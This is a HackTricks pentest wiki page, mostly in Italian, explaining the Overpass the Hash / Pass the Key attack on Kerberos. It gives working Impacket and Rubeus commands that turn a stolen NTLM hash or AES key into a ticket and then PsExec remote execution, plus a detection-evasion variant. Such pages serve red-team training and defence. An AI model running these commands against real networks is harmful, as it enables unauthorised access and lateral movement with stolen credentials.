# Over Pass the Hash/Pass the Key

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Overpass The Hash/Pass The Key (PTK)

L'attacco **Overpass The Hash/Pass The Key (PTK)** è progettato per ambienti in cui il protocollo NTLM tradizionale è limitato e l'autenticazione Kerberos ha la precedenza. Questo attacco sfrutta l'hash NTLM o le chiavi AES di un utente per richiedere ticket Kerberos, consentendo l'accesso non autorizzato a risorse all'interno di una rete.

Per eseguire questo attacco, il primo passo consiste nell'acquisire l'hash NTLM o la password dell'account dell'utente target. Una volta ottenute queste informazioni, è possibile ottenere un Ticket Granting Ticket (TGT) per l'account, consentendo all'attaccante di accedere ai servizi o alle macchine a cui l'utente ha permessi.

Il processo può essere avviato con i seguenti comandi:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Per scenari che richiedono AES256, l'opzione `-aesKey [AES key]` può essere utilizzata. Inoltre, il ticket acquisito potrebbe essere impiegato con vari strumenti, inclusi smbexec.py o wmiexec.py, ampliando l'ambito dell'attacco.

Problemi riscontrati come _PyAsn1Error_ o _KDC cannot find the name_ sono tipicamente risolti aggiornando la libreria Impacket o utilizzando il nome host invece dell'indirizzo IP, garantendo la compatibilità con il KDC di Kerberos.

Una sequenza di comandi alternativa utilizzando Rubeus.exe dimostra un altro aspetto di questa tecnica:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Questo metodo rispecchia l'approccio **Pass the Key**, con un focus sul comando e l'utilizzo del ticket direttamente per scopi di autenticazione. È fondamentale notare che l'inizio di una richiesta TGT attiva l'evento `4768: A Kerberos authentication ticket (TGT) was requested`, che indica un utilizzo di RC4-HMAC per impostazione predefinita, anche se i moderni sistemi Windows preferiscono AES256.

Per conformarsi alla sicurezza operativa e utilizzare AES256, è possibile applicare il seguente comando:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## Riferimenti

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Impara e pratica il hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica il hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository github.

</details>
{% endhint %}
